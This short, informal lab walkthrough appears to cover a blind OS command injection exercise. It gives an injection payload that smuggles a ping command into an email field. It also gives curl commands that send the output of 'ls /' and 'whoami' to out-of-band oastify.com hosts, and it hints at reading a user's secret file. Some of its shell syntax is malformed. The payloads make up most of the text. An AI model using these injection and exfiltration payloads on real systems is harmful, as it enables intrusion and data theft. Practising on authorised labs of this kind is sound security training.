Blind OS command injection with time delays
Launching this command will make you to understand if the command is injectable:

email=x||ping+-c+10+127.0.0.1||

affert this you can send a curl with a body:

if it's possible you can try this payload:
CARLO=$(ls /);curl -i -s -k -X $'POST' -H $'Host: 2psvg4k5bmueqaufdc82cpg4pvvmjb.oastify.com' -H
$'Content-Length: 6' --data-binary $CARLO $'https://2psvg4k5bmueqaufdc82cpg4pvvmjb.oastify.com/'

A variant of this could be 
"curl -i -s -k -X $'POST' -H $'Host: w85pzy3zugd894d9w6rwvjzy8pei27.oastify.com' -H $'Content-Length: 6' --data-binary $`whoami` $'https://w85pzy3zugd894d9w6rwvjzy8pei27.oastify.com/'"

(I suppose that maybe this can help you to succeed at the final stage, retriving SECRET=($cat /home/carlos/secret");..


or you can also use this type of exploit writing the output in a file and save it in a folder where you have the possibility to read the file
